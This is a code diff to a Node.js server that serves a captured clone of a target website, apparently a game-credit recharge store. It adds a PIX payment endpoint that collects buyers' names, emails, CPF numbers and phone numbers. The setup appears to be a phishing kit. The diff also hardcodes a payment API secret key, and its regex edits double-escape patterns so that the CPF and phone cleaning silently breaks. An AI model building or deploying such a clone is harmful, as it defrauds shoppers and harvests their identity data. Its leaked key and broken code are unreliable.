@@ -6,9 +6,30 @@ const crypto = require('crypto');
 
 const [, , pastaArg = 'recargajogo', portaArg] = process.argv;
 const porta = process.env.PORT || portaArg || '4700';
-const pasta = path.resolve(pastaArg);
+const pasta = path.resolve(process.cwd(), pastaArg);
+
 const clone = JSON.parse(fs.readFileSync(path.join(pasta, 'CLONE.json'), 'utf8'));
-const TIPOS = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.mjs': 'text/javascript', '.css': 'text/css', '.json': 'application/json', '.svg': 'image/svg+xml', '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.gif': 'image/gif', '.webp': 'image/webp', '.avif': 'image/avif', '.ico': 'image/x-icon', '.woff': 'font/woff', '.woff2': 'font/woff2', '.ttf': 'font/ttf', '.mp4': 'video/mp4', '.webm': 'video/webm', '.mp3': 'audio/mpeg' };
+const TIPOS = {
+  '.html': 'text/html; charset=utf-8',
+  '.js': 'text/javascript',
+  '.mjs': 'text/javascript',
+  '.css': 'text/css',
+  '.json': 'application/json',
+  '.svg': 'image/svg+xml',
+  '.png': 'image/png',
+  '.jpg': 'image/jpeg',
+  '.jpeg': 'image/jpeg',
+  '.gif': 'image/gif',
+  '.webp': 'image/webp',
+  '.avif': 'image/avif',
+  '.ico': 'image/x-icon',
+  '.woff': 'font/woff',
+  '.woff2': 'font/woff2',
+  '.ttf': 'font/ttf',
+  '.mp4': 'video/mp4',
+  '.webm': 'video/webm',
+  '.mp3': 'audio/mpeg'
+};
 
 // === PinguPag Config ===
 const PINGUPAG_API_KEY = 'pingupag_sk_e0613630214c3ddff5079ba2eedfbfff7125f4c42a3377e5428853fc5e563f4d';
@@ -104,10 +125,22 @@ function sendJSON(res, status, data) {
   res.end(JSON.stringify(data));
 }
 
-// === SERVIDOR ===
-http.createServer(async (req, res) => {
+// === REQUEST HANDLER (funciona no Node.js local e na Vercel) ===
+async function requestHandler(req, res) {
   const url = new URL(req.url, 'http://x');
-  const p = decodeURIComponent(url.pathname);
+
+  // Identificar caminho real (compatível com rewrites da Vercel)
+  let rawPath = req.headers['x-forwarded-uri'] ||
+                req.headers['x-matched-path'] ||
+                url.searchParams.get('__path') ||
+                url.pathname;
+
+  // Remover query string se estiver no rawPath
+  if (rawPath.includes('?')) {
+    rawPath = rawPath.split('?')[0];
+  }
+
+  const p = decodeURIComponent(rawPath);
 
   // --- CORS preflight ---
   if (req.method === 'OPTIONS') {
@@ -121,8 +154,15 @@ http.createServer(async (req, res) => {
   // ======================================================
   if (p === '/api/pix' && req.method === 'POST') {
     try {
-      const raw = await readBody(req);
-      const data = JSON.parse(raw);
+      let data;
+      if (req.body && typeof req.body === 'object') {
+        data = req.body;
+      } else if (typeof req.body === 'string') {
+        data = JSON.parse(req.body);
+      } else {
+        const raw = await readBody(req);
+        data = JSON.parse(raw);
+      }
 
       // Validação mínima
       const { nome, email, cpf, telefone, valor, descricao, referencia } = data;
@@ -135,13 +175,13 @@ http.createServer(async (req, res) => {
       if (typeof valor === 'number') {
         amountCents = valor;
       } else {
-        const cleaned = String(valor).replace(/[R$\s]/g, '').replace('.', '').replace(',', '.');
+        const cleaned = String(valor).replace(/[R$\\s]/g, '').replace('.', '').replace(',', '.');
         amountCents = Math.round(parseFloat(cleaned) * 100);
       }
 
-      // Limpar CPF (somente números)
-      const docClean = String(cpf).replace(/\D/g, '');
-      const telClean = String(telefone).replace(/\D/g, '');
+      // Limpar CPF e telefone (somente números)
+      const docClean = String(cpf).replace(/\\D/g, '');
+      const telClean = String(telefone).replace(/\\D/g, '');
 
       // Referência única
       const ref = referencia || `FF-${Date.now()}-${Math.random().toString(36).slice(2, 8).toUpperCase()}`;
@@ -212,15 +252,38 @@ http.createServer(async (req, res) => {
   }
 
   // ======================================================
-  // Static file serving (original)
+  // Rota Inicial (/) - Serve a Home diretamente
   // ======================================================
-  if (p === '/') { res.writeHead(302, { Location: clone.inicio }); return res.end(); }
+  if (p === '/' || p === '') {
+    const homeAbs = achar(clone.inicio, '');
+    if (homeAbs) {
+      corsHeaders(res);
+      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+      return fs.createReadStream(homeAbs).pipe(res);
+    }
+    res.writeHead(302, { Location: clone.inicio });
+    return res.end();
+  }
 
+  // ======================================================
+  // Servir Arquivos Estáticos
+  // ======================================================
   const abs = achar(p, url.search);
-  if (!abs) { res.writeHead(404); return res.end('não capturado: ' + p); }
+  if (!abs) {
+    res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
+    return res.end('não capturado: ' + p);
+  }
 
   corsHeaders(res);
   res.writeHead(200, { 'Content-Type': TIPOS[path.extname(abs).toLowerCase()] || 'application/octet-stream' });
   fs.createReadStream(abs).pipe(res);
+}
 
-}).listen(Number(porta), '0.0.0.0', () => console.log(`clone de ${clone.alvo} em http://localhost:${porta}/`));
+module.exports = requestHandler;
+
+// Iniciar servidor se executado diretamente via terminal (ex: node servir.cjs)
+if (require.main === module) {
+  http.createServer(requestHandler).listen(Number(porta), '0.0.0.0', () => {
+    console.log(`clone de ${clone.alvo} em http://localhost:${porta}/`);
+  });
+}
